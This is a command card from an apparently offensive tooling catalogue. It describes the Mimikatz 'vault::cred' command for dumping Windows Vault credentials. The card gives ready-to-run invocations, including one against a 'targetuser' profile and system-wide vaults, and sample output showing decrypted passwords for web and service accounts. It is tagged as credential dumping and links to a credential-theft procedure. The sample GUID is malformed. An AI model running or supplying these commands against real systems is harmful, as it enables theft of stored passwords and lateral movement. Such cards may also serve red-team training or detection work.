---
id: 79830348-46f0-4ac6-a984-c93f4e156314
name: mimikatz-vault-cred-dump
type: command
executor: cmd
data: 'vault::cred /in:$_VAULT_PATH'
output: null
created_at: '2023-04-06T03:56:27.573156+00:00'
updated_at: '2023-04-10T20:37:18.042793+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - mimikatz
  - vault
verified: true
validated: true
---

# mimikatz-vault-cred-dump

## Command

```cmd
vault::cred /in:$_VAULT_PATH
```

## Description

This command, executed within the Mimikatz interactive prompt, dumps credentials from the specified Windows Vault directory. It retrieves encrypted blobs and attempts decryption using the current user's DPAPI keys, revealing stored passwords for services like RDP, web auth, or network shares.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/in:$_VAULT_PATH` | Path to the Vault directory (e.g., `C:\Users\%USERNAME%\AppData\Local\Microsoft\Vault`) | Yes |

## Examples

### Basic Usage

```cmd
vault::cred /in:%APPDATA%\Microsoft\Vault
```

### Advanced Usage

```cmd
vault::cred /in:C:\Users\targetuser\AppData\Local\Microsoft\Vault /system
```

(Use `/system` for system-wide vaults if privileges allow.)

## Expected Output

Successful execution displays a list of vault entries:

```
Vault "Current user" (0x00000003) at C:\Users\demo\AppData\Local\Microsoft\Vault\...

  * Vault: Web Credentials

    Guid        : {dsa83d2a-99f1-4bf9-9f5a-5d0c5e5f6a7b}
    CredProvider: MicrosoftPassportProvider
    CredType    : ...
    UserName    : example@domain.com
    Password    : P@ssw0rd123 (decrypted)

  * Vault: Generic Credentials

    Guid        : {...
    UserName    : DOMAIN\serviceaccount
    Password    : ServiceP@ss (decrypted)
```

Look for plaintext passwords or hashes in the output. Errors may occur if DPAPI access is denied.

## Related

- [[procedures/Windows-Vault-Credential-Theft-with-Mimikatz]]
- [[tools/Mimikatz]]
